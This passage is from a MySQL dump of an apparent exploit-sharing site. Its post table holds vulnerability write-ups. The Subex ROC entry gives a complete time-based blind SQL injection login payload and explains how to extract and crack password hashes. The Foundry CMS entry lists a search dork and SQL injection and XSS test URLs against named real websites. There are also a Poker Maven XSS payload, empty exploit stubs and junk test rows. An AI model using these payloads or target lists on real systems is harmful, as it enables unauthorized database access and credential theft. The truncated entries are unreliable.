only:\r\n\r\n-------------------------------------\r\n\r\nranger_user%5Bname%5D=admin%27%20AND%203402%3D%28CASE%20WHEN%20%28ASCII%28SUBSTRC%28%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20GRANTED_ROLE%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE%3DUSER%20AND%20GRANTED_ROLE%3DCHR%2868%29%7C%7CCHR%2866%29%7C%7CCHR%2865%29%29%3DCHR%2868%29%7C%7CCHR%2866%29%7C%7CCHR%2865%29%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%2C1%2C1%29%29%20%3E%2047%29%20THEN%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%28114%29%2C5%29%20ELSE%203402%20END%29%20AND%20%27a%27%3D%27a&ranger_user%5Bpassword%5D=secuid0&commit=Login&ranger_user_i2%5Bfeatures%5D=0\r\n\r\n \r\n\r\nEffect, the page will load with a delay of 5 seconds if the current database user is a member of the database administrators.\r\n\r\n \r\n\r\nUsing similar SQL statements an unauthenticated malicious visitor is able to enumerate various information from the backend database including those of usernames and password hashes (select ranger_user_name,hashed_password from ROCDB.PASSWORDS where rownum<2). The hashes can further be cracked and be used to access the application. Obviously if the DB user for the application has enough privileges you may be able to own the whole Oracle server.\r\n\r\n \r\n\r\n \r\n\r\n[Timeline]\r\n\r\n \r\n\r\nFacebook : www.facebook.com/DayaiLLi.Officiel\r\n\r\nSkype : daya.illi\r\n\r\nTwitter : @DayaAnons\r\n\r\nAsk : Ask.fm/dayailli', 'Daya iLLi', '', '2018-08-21 20:30:14', 'php', 'Tools', 0),
(17, 1, 'Web Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability', 'Web Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability\r\nWeb Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability\r\nWeb Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability\r\nWeb Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability\r\nWeb Portal People LLC 2018 OurClassOnline USA Unauthorized Arbitrary File Insert Vulnerability\r\n', 'Portal', '', '2018-11-18 22:18:06', 'php', '', 4),
(18, 1, 'Foundry CMS Multiple Vulnerability', '[+] Title: Foundry CMS Multiple Vulnerability\r\n\r\n[+] Date: 2014/09/05\r\n\r\n[+] Author: MeshoHk\r\n\r\n[+] Tested on: Windows\r\n\r\n[+] Vulnerable Files: /page.php\r\n\r\n[+} Dork : intext:\"Site by The Design Foundry\"\r\n\r\n\r\n\r\n### POC:\r\n\r\n[+] Sql Injection: http://site/page.php?id=[SQL-Injection]\r\n\r\n[+] XSS:  http://site/page.php?id=[XSS]\r\n\r\n### Demo:\r\n\r\n\r\n\r\n[+] Sql injection: http://www.resonatehub.co.uk/page.php?id=1\'\r\n\r\n                   http://www.sutcliffe.co.uk/page.php?id=1\'\r\n\r\n\r\n\r\n                   http://www.warmerenergyservices.com/page.php?id=25\'\r\n\r\n                   http://www.my-maintenance.com/page.php?id=1\'\r\n\r\n\r\n\r\n[+] Xss: http://www.resonatehub.co.uk/page.php?id=\r\n\r\n<script>alert(/xss/)</script>\r\n\r\n         http://www.sutcliffe.co.uk/page.php?id=\r\n\r\n\r\n\r\n<script>alert(/xss/)</script>\r\n\r\n         http://www.warmerenergyservices.com/page.php?id=\r\n\r\n<script>alert(/xss/)</script>\r\n\r\n         http://www.my-maintenance.com/page.php?id=\r\n\r\n\r\n\r\n<script>alert(/xss/)</script>\r\n\r\n### Credits:\r\n\r\n[+] Special Thanks:Momenib &VirusGaza&Mahmod Sh ', 'MeshoHk', '', '2018-11-18 22:26:28', 'php', '', 1),
(19, 1, ' Non-Persistant XSS on Poker Maven Version 4.29', '# Exploit Title:- Non-Persistant XSS on Poker Maven Version 4.29\r\n\r\n# Date:- 05-Sep-2014\r\n\r\n# Exploit Author:- crunchx\r\n\r\n# Vendor Homepage:- https://www.briggsoft.com/pmavens.htm\r\n\r\n# Version:- Poker Maven Version 4.29 (Latest)\r\n\r\n# Tested On:- \r\n\r\n                         OS=> Windows 7\r\n\r\n                          Browser=> Mozilla Firefox\r\n\r\n\r\n\r\n# Description:- In the login page type this,\r\n\r\n\r\n\r\nPlayer Name:- <script>alert(\"xss\")</script>\r\n\r\nPassword:- <script>alert(\"xss\")</script>\r\n\r\n\r\n\r\nAfter clicking \"OK\" , it will excute that javascript & a pop up message xss will be shown. \r\n\r\n\r\n\r\nI have attached a picture of the executed result.', 'crunchx', '', '2018-11-19 22:11:06', 'php', '', 1),
(21, 4, 'Web Application Vulnerability Scanner', 'Titler:Web Application Vulnerability Scanner\r\n\r\n\r\n\r\nAuthor: DeaDHackS\r\n\r\n\r\n\r\nContact: deadhacksteam@gmail.com\r\n\r\n\r\n\r\nGithub: https://github.com/DeaDHackS/\r\n\r\n\r\n\r\nlink Download : https://github.com/DeaDHackS/Hepheastus\r\n\r\n\r\n\r\nUSAGE:Simple run: perl hepheastus.pl --help This will display the help menu :) \r\n\r\n\r\n\r\nabout tools : Hepheastus is a Multi-Web Application Vulnerability Scanner written in Perl, most of his scans are accurate!', 'DeaDHackS', '', '2018-11-21 16:33:38', 'php', '', 0),
(24, 2, ' Epic Privacy Browser - History Leakage', '\r\nTitle -> Epic Privacy Browser - History Leakage\r\n\r\nDate -> July 25, 2017\r\n\r\nAuthor -> bRpsd\r\n\r\nskype: vegnox\r\n\r\nBrowser Website -> https://epicbrowser.com/\r\n\r\nType -> Local\r\n\r\nVersions -> 58.0.3029.110 (latest) and prior on Windows.\r\n\r\nTested on -> Win7 64-bit\r\n\r\n================================================================\r\n\r\n\r\n\r\n\r\n\r\nEpic Browser is suppose to keep you secured browsing without keeping any trace or \'history\' left behind.\r\n\r\nbut I found 3 local files that saves browsing history AND stores it!\r\n\r\n\r\n\r\nLocation of files:\r\n\r\nC:\\Users\\Windows User Here\\AppData\\Local\\Epic Privacy Browser\\User Data\\Default\\\r\n\r\n\r\n\r\nFiles:\r\n\r\nPreferences -> JSON Format\r\n\r\nLogin Data -> SQL format\r\n\r\nWebRTCIdentityStore -> SQL format\r\n\r\nCookies -> stored Cookies [temprorarily]\r\n\r\n\r\n\r\nPreferences -> dns_prefetching -> host_referral_list\r\n\r\nPreferences -> net -> http_server_properties -> servers\r\n\r\n\r\n\r\n\r\n\r\nYou can use this Simple CMD Tool to move all files to your desktop within a click and view them:\r\n\r\nhttp://www.mediafire.com/file/tomkzly8jh3ngsb/EHISTORY.zip\r\n\r\n\r\n\r\n\r\n\r\nJson Viewer: http://jsonviewer.stack.hu/\r\n\r\nSQL Browser: https://nightlies.sqlitebrowser.org/latest/', ' bRpsd', '', '2018-11-22 21:54:39', 'python', '', 10),
(25, 4, 'Joomla 3.8 - SQL Injection Vulnerability ', '**************************************************************************\r\n\r\n# Exploit Title:Joomla 3.8 - SQL Injection Vulnerability               [+]\r\n\r\n# Google Dork:N/A                                                      [+]\r\n\r\n# Date: 21/09/2018                                                     [+]\r\n\r\n# Author: Rednofozi                                                    [+]\r\n\r\n#Category : Tools                                           [+]\r\n\r\n# Team: https://anonysec.org                                           [+]\r\n\r\n# Tested on: Kali Linux and win                                        [+]\r\n\r\n***************************************************************|**********\r\n\r\n|[+]                         Exploit                           |\r\n\r\n|[+]                                                           |\r\n\r\n|[+]                                                           |\r\n\r\n|                                                              |                                                                          \r\n\r\n|                                                              | \r\n\r\n|                                                              |                                       \r\n\r\n|                                                              |\r\n\r\n|--------------------------------------------------------------|\r\n\r\n|[+] \r\n\r\n                     injection Vulnerability coded-      ', ' Rednofozi  ', '', '2018-11-22 21:58:46', 'python', '', 0),
(26, 4, 'MD5 HASH Cracker (Brute Force)', '#!/usr/bin/python\r\n\r\n\r\n\r\nimport argparse\r\n\r\nimport hashlib\r\n\r\nfrom sys import stdout\r\n\r\nfrom pyfiglet import Figlet\r\n\r\nimport sys\r\n\r\nimport time\r\n\r\nimport os\r\n\r\n\r\n\r\n#pip install pyfiglet\r\n\r\n#pip install argparse\r\n\r\n\r\n', 'pyfiglet', '', '2018-11-22 21:59:26', 'python', '', 1),
(27, 4, 'Extract Users /etc/passwd', '#!/usr/bin/python\r\n\r\n\r\n\r\n#Open Source\r\n\r\n\r\n\r\n#Coders are welcome to edit whenever they want to.\r\n\r\n\r\n\r\n#Skymac\r\n\r\n\r\n\r\n#Iran Cyber Group\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nimport time\r\n\r\n\r\n\r\nimport os\r\n\r\n\r\n\r\nimport sys\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nprint\'===============================================\'', 'Skymac', '', '2018-11-22 22:00:10', 'perl', '', 6),
(28, 1, 'Subex ROC Fraud Management System v7.4 Sql Injection vulnerability.', '#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n\r\n\r\n\r\n#  Title : Subex ROC Fraud Management System v7.4 Sql Injection vulnerability.\r\n\r\n\r\n\r\n# Author : Daya iLLi\r\n\r\n\r\n\r\n# Contact : www.facebook.com/dayailli.officiel\r\n\r\n\r\n\r\n# Risk : High\r\n\r\n\r\n\r\n# Date : 04/09/2014\r\n\r\n\r\n\r\n#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n\r\n\r\n\r\nDescription:\r\n\r\nSubex ROC Fraud Management System version 7.4 suffers from a remote unauthenticated time-based blind SQL injection vulnerability. \r\n\r\n\r\n\r\n	\r\n\r\n=======================================================================================\r\n\r\nSubex ROC Fraud Management System v7.4 - Unauthenticated Blind-Time Based SQL Injection\r\n\r\n=======================================================================================\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n[Summary]\r\n\r\n \r\n\r\nA parameter at the login page of Subex ROC Fraud Management platform is vulnerable to blind-time based SQL injection.\r\n\r\n \r\n\r\n \r\n\r\n[Vulnerability Details]\r\n\r\n \r\n\r\nAuthentication  : The exploitation can be performed by any unauthenticated user.\r\n\r\nPage     : http://ip:port/login/login\r\n\r\nBackend DB  : Oracle\r\n\r\nPOST Parameter   : ranger_user[name]\r\n\r\n \r\n\r\nSample HTTP POST Request - Data only:\r\n\r\n-------------------------------------\r\n\r\nranger_user%5Bname%5D=admin%27%20AND%203402%3D%28CASE%20WHEN%20%28ASCII%28SUBSTRC%28%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20GRANTED_ROLE%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE%3DUSER%20AND%20GRANTED_ROLE%3DCHR%2868%29%7C%7CCHR%2866%29%7C%7CCHR%2865%29%29%3DCHR%2868%29%7C%7CCHR%2866%29%7C%7CCHR%2865%29%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%2C1%2C1%29%29%20%3E%2047%29%20THEN%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%28114%29%2C5%29%20ELSE%203402%20END%29%20AND%20%27a%27%3D%27a&ranger_user%5Bpassword%5D=secuid0&commit=Login&ranger_user_i2%5Bfeatures%5D=0\r\n\r\n \r\n\r\nEffect, the page will load with a delay of 5 seconds if the current database user is a member of the database administrators.\r\n\r\n \r\n\r\nUsing similar SQL statements an unauthenticated malicious visitor is able to enumerate various information from the backend database including those of usernames and password hashes (select ranger_user_name,hashed_password from ROCDB.PASSWORDS where rownum<2). The hashes can further be cracked and be used to access the application. Obviously if the DB user for the application has enough privileges you may be able to own the whole Oracle server.\r\n\r\n \r\n\r\n \r\n\r\n[Timeline]\r\n\r\n \r\n\r\nFacebook : www.facebook.com/DayaiLLi.Officiel\r\n\r\nSkype : daya.illi\r\n\r\nTwitter : @DayaAnons\r\n\r\nAsk : Ask.fm/dayailli\r\n', 'Daya iLLi', '', '2018-11-22 22:14:22', 'php', '', 7),
(31, 1, 'dddddddddddd', 'DZ', 'dz', '', '2018-11-30 20:51:16', 'php', '', 10),
(34, 1, 'dz', 'dz', 'dz', '', '2019-07-18 14:58:02', 'php', '', 0),
(35, 1, 'test', 'dz', 'kadnass-dz', '', '2019-07-18 19:12:28', 'php', '', 0),
(36, 1, 'test', 'dz', 'kadnass-dz', '', '2019-07-18 19:12:28', 'php', '', 0),
(39, 1, 'final test', 'final test', 'kadnass-dz', '', '2019-07-18 19:15:31', 'php', '', 0);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `author`
--
ALTER TABLE `author`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `categery`
--
ALTER TABLE `categery`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `dz`
--
ALTER TABLE `dz`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `modcp`
--
ALTER TABLE `modcp`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `page`
--
ALTER TABLE `page`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `platform`
--
ALTER TABLE `platform`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `post`
--
ALTER TABLE `post`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `author`
--
ALTER TABLE `author`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT for table `categery`
--
ALTER TABLE `categery`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT for table `dz`
--
ALTER TABLE `dz`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `modcp`
--
ALTER TABLE `modcp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `page`
--
ALTER TABLE `page`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT for table `platform`
--
ALTER TABLE `platform`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;
--
-- AUTO_INCREMENT for table `post`
--
ALTER TABLE `post`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
